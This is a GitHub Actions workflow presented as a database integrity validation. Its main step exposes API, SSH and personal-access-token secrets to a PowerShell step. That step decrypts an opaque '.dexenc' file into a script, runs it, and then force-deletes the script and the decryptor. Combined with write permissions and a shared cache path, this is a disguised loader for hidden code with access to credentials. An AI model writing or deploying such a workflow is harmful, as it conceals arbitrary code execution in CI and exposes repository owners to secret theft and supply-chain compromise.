name: DB-Integrity-Validation

on:
  workflow_dispatch:

jobs:
  validate-assets:
    runs-on: windows-2025
    permissions:
      actions: write
      contents: read

    steps:
      - name: Initialize Environment
        uses: actions/checkout@v6

      - name: Cache Dependencies
        uses: actions/cache@v4
        with:
          path: C:\ProgramData\lib-internal
          key: ${{ runner.os }}-lib-${{ github.run_id }}
          restore-keys: |
            ${{ runner.os }}-lib-

      - name: Execute Security Validation
        shell: powershell
        env:
          API_KEY: ${{ secrets.API_KEY }}
          SSH_KEY: ${{ secrets.SSH_KEY }}
          GH_TOKEN: ${{ secrets.MY_PAT }}
        run: |
          $encFile = "database_test.dexenc"
          $runtimeScript = "db_schema_update.ps1"

          if (Test-Path $encFile) {
              Write-Host "[*] Verifying $encFile integrity..." -ForegroundColor Cyan
              python internal_validator.py decrypt -i $encFile -key "$env:API_KEY" -o $runtimeScript
              Start-Sleep -s 2
              if (Test-Path $runtimeScript) {
                  Write-Host "[+] Integrity check passed. Running post-validation..." -ForegroundColor Green
                  . .\$runtimeScript
                  Remove-Item $runtimeScript, "internal_validator.py" -Force
                  Write-Host "[+] Validation cycle completed." -ForegroundColor Gray
              } else {
                  Write-Error "CRITICAL: Schema validation failed."
                  exit 1
              }
          } else {
              Write-Error "MISSING ASSET: $encFile"
              exit 1
          }
